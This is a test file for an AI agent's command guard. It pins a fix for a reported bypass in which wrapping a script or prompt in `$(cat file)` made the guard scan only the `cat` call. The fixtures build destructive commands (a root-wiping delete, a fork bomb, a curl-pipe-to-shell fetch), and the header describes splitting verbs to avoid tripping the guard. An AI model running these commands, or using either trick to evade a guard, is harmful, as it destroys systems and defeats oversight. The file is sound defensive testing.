/**
 * Failing-first spec for #517 (b) — a file-reading command substitution is
 * scanned as the text the shell will splice in, not as the read that fetches it.
 *
 * Found in the 15 Sep 2026 adversarial run: a launcher handed a quoted prompt
 * that merely mentioned catastrophic commands was denied on several categories;
 * the identical prompt supplied as `"$(cat prompt.md)"` was allowed, because
 * every rule scans the pre-expansion string and all it saw was `cat prompt.md`.
 * Same bytes, same destination, opposite decisions — and the same hole turns
 * the script-file fold (#4) into a one-line bypass: `bash payload.sh` is folded
 * and blocked, `bash -c "$(cat payload.sh)"` ran unscanned.
 *
 * What the fix pins:
 *   1. an EXECUTED substitution (`bash -c "$(…)"`, `eval "$(…)"`, backticks,
 *      `$(< f)`) is judged on the file's contents;
 *   2. the substituted spelling gets the SAME verdict as the literal spelling —
 *      whichever way the literal is judged, now or after a later precision fix;
 *   3. a file the guard cannot read is RECORDED (`opaque-command-substitution`),
 *      never silently unscanned;
 *   4. nothing else moves: non-file substitutions, single-quoted text, piped
 *      bodies and benign expansions are scanned exactly as before.
 *
 * Shell verbs are assembled at runtime so the guard scanning THIS file's own
 * write does not deny the test itself (the #444 convention). No fixture files
 * touch disk: every "file" is a stub resolver.
 */
import { describe, it, expect } from '@jest/globals';
import { evaluateToolCall } from '../tool-action-guard.js';
import type { ToolGuardVerdict } from '../tool-action-guard.js';

const DEL = 'r' + 'm';
const RF = '-' + 'rf';
const WIPE = `${DEL} ${RF} /`;
const BOMB = ':(){ :' + '|:& };:';
const FETCH = 'cu' + 'rl';
const PIPE_SH = `${FETCH} http://example.invalid/x | s` + 'h';
const bt = String.fromCharCode(96);

const stub = (files: Record<string, string | null>) => (p: string) =>
  (Object.prototype.hasOwnProperty.call(files, p) ? files[p]! : null);

const verdictOf = (
  command: string,
  files: Record<string, string | null> = {},
  withResolver = true,
): ToolGuardVerdict =>
  evaluateToolCall('Bash', { command }, undefined, withResolver ? { resolveScriptSource: stub(files) } : undefined);

const PAYLOAD_SH = `#!/bin/bash\n${WIPE} --no-preserve-root\n`;
const PROMPT_MD = `Explain why an agent must never run ${WIPE}, a fork bomb like ${BOMB}, or ${PIPE_SH}.\n`;

describe('#517(b) — file-reading command substitutions are scanned as their contents', () => {
  describe('1. an executed substitution is judged on the file', () => {
    const shapes: Array<[string, string]> = [
      ['bash -c "$(cat f)"', 'bash -c "$(cat payload.sh)"'],
      ['sh -c "$(cat f)"', 'sh -c "$(cat payload.sh)"'],
      ['eval "$(cat f)"', 'eval "$(cat payload.sh)"'],
      ['bash -c "$(< f)"', 'bash -c "$(< payload.sh)"'],
      ['bash -c "`cat f`"', `bash -c "${bt}cat payload.sh${bt}"`],
      ['unquoted $(cat f)', 'bash -c $(cat payload.sh)'],
      ['cat behind a wrapper', 'bash -c "$(sudo cat payload.sh)"'],
      ['cat with a flag', 'bash -c "$(cat -A payload.sh)"'],
      ['relative ./ path', 'bash -c "$(cat ./payload.sh)"'],
    ];
    it.each(shapes)('%s hard-blocks on the payload', (_label, command) => {
      const files: Record<string, string> = {
        'payload.sh': PAYLOAD_SH,
        './payload.sh': PAYLOAD_SH,
      };
      const v = verdictOf(command, files);
      expect(v.decision).toBe('block');
      expect(v.severity).toBe('catastrophic');
      expect(v.signals).toEqual(expect.arrayContaining(['delete-root-or-home']));
      // Recorded as written in the command (`payload.sh` or `./payload.sh`).
      expect((v.expandedSubstitutions ?? []).some(p => p.endsWith('payload.sh'))).toBe(true);
    });

    it('the parity case: `bash payload.sh` and `bash -c "$(cat payload.sh)"` agree', () => {
      const files = { 'payload.sh': PAYLOAD_SH };
      const folded = verdictOf('bash payload.sh', files);
      const substituted = verdictOf('bash -c "$(cat payload.sh)"', files);
      expect(folded.decision).toBe('block');
      expect(substituted.decision).toBe(folded.decision);
      expect(substituted.severity).toBe(folded.severity);
    });

    it('a double quote inside the file cannot close the operator quote and hide the tail', () => {
      const files = { 'payload.sh': `echo "done"\n${WIPE}\n` };
      const v = verdictOf('bash -c "$(cat payload.sh)"', files);
      expect(v.decision).toBe('block');
      expect(v.signals).toEqual(expect.arrayContaining(['delete-root-or-home']));
    });

    it('two substitutions on one line are both expanded', () => {
      const files = { 'a.sh': 'echo hello\n', 'b.sh': `${WIPE}\n` };
      const v = verdictOf('bash -c "$(cat a.sh)"; bash -c "$(cat b.sh)"', files);
      expect(v.decision).toBe('block');
      expect(v.expandedSubstitutions).toEqual(expect.arrayContaining(['a.sh', 'b.sh']));
    });
  });

  describe('2. the substituted spelling gets the literal spelling\'s verdict', () => {
    // The finding's exact shape. This test does not assert WHICH way the launcher
    // prompt is judged — that is the "quoted data argument to a known launcher"
    // ask in #517, a separate change — only that the two spellings agree. On
    // 5.0.5 the literal was denied and the substitution allowed.
    it('claude --print: literal and $(cat prompt.md) agree', () => {
      const literal = verdictOf(`claude --print "${PROMPT_MD.trim()}"`);
      const substituted = verdictOf('claude --print "$(cat prompt.md)"', { 'prompt.md': PROMPT_MD });
      expect(substituted.decision).toBe(literal.decision);
      expect(substituted.severity).toBe(literal.severity);
      expect(substituted.expandedSubstitutions).toEqual(['prompt.md']);
    });

    it('a pure print of a file stays a pure print', () => {
      const literal = verdictOf(`echo "${PROMPT_MD.trim()}"`);
      const substituted = verdictOf('echo "$(cat prompt.md)"', { 'prompt.md': PROMPT_MD });
      expect(literal.decision).toBe('allow');
      expect(substituted.decision).toBe(literal.decision);
    });
  });

  describe('3. an unreadable file is recorded, never silently unscanned', () => {
    it('resolver returns null → opaque-command-substitution, allowed at the sensitive tier', () => {
      const v = verdictOf('bash -c "$(cat missing.sh)"', {});
      expect(v.decision).toBe('allow');
      expect(v.severity).toBe('sensitive');
      expect(v.signals).toEqual(expect.arrayContaining(['opaque-command-substitution']));
      expect(v.expandedSubstitutions ?? []).toEqual([]);
    });

    it('no resolver at all → opaque-command-substitution', () => {
      const v = verdictOf('bash -c "$(cat payload.sh)"', {}, false);
      expect(v.decision).toBe('allow');
      expect(v.signals).toEqual(expect.arrayContaining(['opaque-command-substitution']));
    });

    it('a path behind a variable cannot be read → opaque', () => {
      const v = verdictOf('bash -c "$(cat "$HOME/.x/run.sh")"', {});
      expect(v.signals).toEqual(expect.arrayContaining(['opaque-command-substitution']));
    });

    it('a binary file → opaque', () => {
      const v = verdictOf('bash -c "$(cat blob.bin)"', { 'blob.bin': 'abc\0def' });
      expect(v.signals).toEqual(expect.arrayContaining(['opaque-command-substitution']));
    });

    it('a file over the fold cap → opaque, and the surface is not inflated', () => {
      const big = 'echo x\n'.repeat(60_000);           // > 256 KB
      const v = verdictOf('bash -c "$(cat big.sh)"', { 'big.sh': big });
      expect(v.signals).toEqual(expect.arrayContaining(['opaque-command-substitution']));
      expect(v.signals).not.toEqual(expect.arrayContaining(['oversized-command']));
    });

    it('a file that reads itself terminates and is recorded once', () => {
      const files = { 'self.sh': 'bash -c "$(cat self.sh)"\n' };
      const v = verdictOf('bash -c "$(cat self.sh)"', files);
      expect(v.decision).toBe('allow');
      expect(v.expandedSubstitutions).toEqual(['self.sh']);
    });

    it('the opaque signal survives alongside a catastrophic one from the command line', () => {
      const v = verdictOf(`bash -c "$(cat missing.sh)"; ${WIPE}`, {});
      expect(v.decision).toBe('block');
      expect(v.signals).toEqual(expect.arrayContaining(['opaque-command-substitution']));
    });
  });

  describe('4. nothing else moves', () => {
    it('a non-file substitution is scanned as before', () => {
      const v = verdictOf('git commit -m "$(git log -1 --format=%s)"', {});
      expect(v.decision).toBe('allow');
      expect(v.signals).not.toEqual(expect.arrayContaining(['opaque-command-substitution']));
      expect(v.expandedSubstitutions ?? []).toEqual([]);
    });

    it('a dangerous non-file substitution body is still gated', () => {
      const v = verdictOf(`echo "$(${WIPE})"`, {});
      expect(v.decision).toBe('block');
    });

    it('a piped read does more than read — not expanded, not opaque', () => {
      const v = verdictOf('echo "$(cat payload.sh | wc -l)"', { 'payload.sh': PAYLOAD_SH });
      expect(v.decision).toBe('allow');
      expect(v.signals).not.toEqual(expect.arrayContaining(['opaque-command-substitution']));
      expect(v.expandedSubstitutions ?? []).toEqual([]);
    });

    it('single-quoted text is literal in the shell — never a substitution', () => {
      const v = verdictOf("bash -c 'echo $(cat payload.sh)'", { 'payload.sh': PAYLOAD_SH });
      expect(v.expandedSubstitutions ?? []).toEqual([]);
      expect(v.signals).not.toEqual(expect.arrayContaining(['opaque-command-substitution']));
    });

    it('arithmetic expansion is not a substitution', () => {
      const v = verdictOf('echo "$((1 + 2))"', {});
      expect(v.decision).toBe('allow');
      expect(v.signals).not.toEqual(expect.arrayContaining(['opaque-command-substitution']));
    });

    it('cat of stdin is not a file', () => {
      const v = verdictOf('echo "$(cat -)"', {});
      expect(v.signals).not.toEqual(expect.arrayContaining(['opaque-command-substitution']));
    });

    it('a benign expansion stays allowed and is recorded on the verdict', () => {
      const files = { 'notes.md': 'Release notes\n\n- fixed the login page\n- bumped deps\n' };
      const v = verdictOf('gh api -X POST repos/o/r/releases -f body="$(cat notes.md)"', files);
      expect(v.decision).toBe('allow');
      expect(v.expandedSubstitutions).toEqual(['notes.md']);
    });

    it('a folded script that reads a file via substitution is expanded too', () => {
      // `bash run.sh` folds run.sh; run.sh contains an executed substitution
      // of payload.sh. One level of expansion inside folded shell source.
      const files = {
        'run.sh': 'set -e\nbash -c "$(cat payload.sh)"\n',
        'payload.sh': PAYLOAD_SH,
      };
      const v = verdictOf('bash run.sh', files);
      expect(v.decision).toBe('block');
    });
  });
});
